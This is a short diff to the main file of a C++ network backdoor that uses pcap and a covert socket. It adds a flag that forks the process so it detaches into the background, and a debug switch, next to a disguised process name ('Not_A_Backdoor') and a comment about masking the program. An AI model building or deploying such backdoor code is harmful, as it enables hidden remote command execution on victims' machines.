@@ -4,9 +4,11 @@
 #include <signal.h>
 #include <csignal>
 #include <pcap.h>
+#include <zconf.h>
 #include "NetworkMonitor.h"
 #include "CovertSocket.h"
 #include "../utils/Logger.h"
+#include "../utils/argparcer.h"
 
 #define newProcessName "Not_A_Backdoor"
 
@@ -119,8 +121,25 @@ string executeCommand(string command){
 
 int main(int argc, char * argv[]) {
 
-    Logger::setDebug(true);
 
+    ArgParcer parcer;
+
+    if(parcer.TagExists("--LEAVE", argv, argc)){
+
+        pid_t pid = fork();
+        if(pid < 0){
+            cout << "There Was An Error Forking. Aborting" << endl;
+            return 1;
+        }
+
+        if(pid > 0){
+            cout << "This Is The Parent. Terminating" << endl;
+            return 0;
+        }
+
+    }
+
+    Logger::setDebug(parcer.TagExists("--DEBUG", argv, argc));
     Logger::debug("Starting Program");
 
     //mask the program
